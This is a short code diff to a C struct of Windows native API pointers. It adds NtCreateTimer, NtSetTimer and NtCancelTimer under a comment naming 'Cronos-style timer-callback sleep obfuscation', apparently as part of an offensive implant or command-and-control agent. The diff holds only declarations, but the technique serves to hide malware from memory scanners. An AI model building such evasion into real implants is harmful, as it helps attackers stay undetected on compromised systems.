@@ -229,6 +229,10 @@ typedef struct
         WIN_FUNC( NtQueryInformationThread )
         WIN_FUNC( NtQueryObject )
         PVOID NtTraceEvent;
+        /* ARC-03: Cronos-style timer-callback sleep obfuscation */
+        WIN_FUNC( NtCreateTimer )
+        WIN_FUNC( NtSetTimer )
+        WIN_FUNC( NtCancelTimer )
 
         // Kernel32
         WIN_FUNC( LoadLibraryW )
